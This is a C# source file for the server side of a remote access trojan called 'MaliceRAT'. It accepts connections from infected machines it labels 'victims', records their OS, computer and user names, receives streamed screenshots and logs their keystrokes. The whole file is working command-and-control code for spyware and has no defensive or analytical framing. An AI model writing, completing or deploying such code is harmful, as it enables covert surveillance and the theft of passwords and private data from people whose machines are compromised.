using System;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Web.Script.Serialization;
using System.IO;
using System.Windows.Forms;

namespace MaliceRAT.RatServer
{
    public class Server
    {
        #region Features
        public ScreenViewer screenViewer = new ScreenViewer();
        #endregion

        #region Events
        public event Action<string> MessageReceived;
        public event Action<Victim> InfoReceived;
        public event Action<Victim> ClientConnected;
        public event Action<Victim> ClientDisconnected;
        public event Action<Victim, string> KeystrokeReceived;
        #endregion

        #region Variables
        private dynamic config;
        private TcpListener server;
        private int BufferSize;
        private double HeartbeatInterval;
        private string IP;
        private int Port;
        public List<Victim> victims = new List<Victim>();
        private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
        private JavaScriptSerializer serializer = new JavaScriptSerializer();
        // Console
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        #endregion

        #region Constructor
        public Server()
        {
            AllocConsole();
            string configPath = Path.Combine(Application.StartupPath, "config.json");
            if (File.Exists(configPath))
            {
                string configJson = File.ReadAllText(configPath);
                config = serializer.Deserialize<dynamic>(configJson);

                BufferSize = config["server_bufferSize"];
                HeartbeatInterval = config["server_heartbeat"];
                IP = config["server_ip"];
                Port = config["server_port"];

                Console.WriteLine("Config loaded from " + configPath);
            }
            else
            {
                Console.WriteLine("config.json not found.");
                Application.Exit();
            }
        }
        #endregion

        public void StartServer()
        {
            IPAddress ipAddress = IPAddress.Parse(IP);
            server = new TcpListener(ipAddress, Port);
            server.Start();
            Console.WriteLine("Server started at " + server.LocalEndpoint);
            Task.Run(async () => await AcceptClients());
        }

        private async Task AcceptClients()
        {
            while (true)
            {
                TcpClient tcpClient = await server.AcceptTcpClientAsync();
                Victim client = new Victim(tcpClient, victims.Count);
                OnClientConnected(client);
                var clientTask = HandleClient(client);
                clientTasks[client.Id] = clientTask;
                await clientTask.ContinueWith(t => clientTasks.Remove(client.Id));
            }
        }

        private async Task HandleClient(Victim client)
        {
            using (NetworkStream stream = client.TcpClient.GetStream())
            {
                byte[] buffer = new byte[BufferSize];
                int bytesRead;

                System.Timers.Timer heartbeatTimer = new System.Timers.Timer(HeartbeatInterval);
                bool heartbeatReceived = true;

                heartbeatTimer.Elapsed += async (sender, e) =>
                {
                    if (!heartbeatReceived)
                    {
                        heartbeatTimer.Stop();
                        stream.Close();
                        OnClientDisconnected(client);
                        return;
                    }
                    heartbeatReceived = false;
                    await SendHeartbeat(stream);
                };
                heartbeatTimer.Start();

                while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                {
                    string receivedMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("Received message: " + receivedMessage);
                    try
                    {
                        dynamic jsonMessage = serializer.Deserialize<dynamic>(receivedMessage);

                        if (jsonMessage["type"] == "message")
                        {
                            OnMessageReceived(jsonMessage["text"].ToString());
                        }
                        else if (jsonMessage["type"] == "info")
                        {
                            string OS = jsonMessage["os"].ToString();
                            string PC = jsonMessage["pc"].ToString();
                            string User = jsonMessage["user"].ToString();

                            IPEndPoint clientEndPoint = client.TcpClient.Client.RemoteEndPoint as IPEndPoint;
                            client.IP = clientEndPoint.Address.ToString();

                            client.OS = OS;
                            client.PC = PC;
                            client.User = User;

                            InfoReceived?.Invoke(client);
                        }
                        else if (jsonMessage["type"] == "heartbeat")
                        {
                            heartbeatReceived = true;
                        }
                        else if (jsonMessage["type"] == "screenshot_chunk")
                        {
                            screenViewer.HandleScreenshotChunk(jsonMessage["data"].ToString(), jsonMessage["final"]);
                        }
                        else if (jsonMessage["type"] == "stop_screenshots")
                        {
                            Console.WriteLine("Client has stopped sending screenshots: " + client.IP);
                        }
                        else if (jsonMessage["type"] == "keystroke")
                        {
                            string keystroke = jsonMessage["key"].ToString();
                            Console.WriteLine($"Keystroke received from {client.IP}: {keystroke}");
                            KeystrokeReceived?.Invoke(client, keystroke);
                        }
                    }
                    catch (InvalidOperationException)
                    {
                        Console.WriteLine("Invalid JSON received.");
                        continue;
                    }
                }
                
                heartbeatTimer.Stop();
                OnClientDisconnected(client);
            }
        }

        protected virtual void OnMessageReceived(string message)
        {
            MessageReceived?.Invoke(message);
        }

        protected virtual void OnClientConnected(Victim client)
        {
            victims.Add(client);
            Console.WriteLine("Client connected: " + client.IP);
            ClientConnected?.Invoke(client);
        }

        protected virtual void OnClientDisconnected(Victim client)
        {
            victims.Remove(client);
            Console.WriteLine("Client disconnected: " + client.IP);
            ClientDisconnected?.Invoke(client);
        }
        
        private async Task SendHeartbeat(NetworkStream stream)
        {
            var heartbeat = new { type = "heartbeat", text = "ping" };
            Victim client = victims.Find(v => v.TcpClient.GetStream() == stream);
            if (client != null)
            {
                await Task.Run(() => SendMessageTo(client, heartbeat));
            }
        }

        public Victim GetVictimById(int id)
        {
            return victims.Find(v => v.Id == id);
        }

        public void SendMessageTo(Victim client, object message)
        {
            string jsonMessage = serializer.Serialize(message);
            byte[] data = Encoding.UTF8.GetBytes(jsonMessage);
            client.TcpClient.GetStream().Write(data, 0, data.Length);
        }
    }
}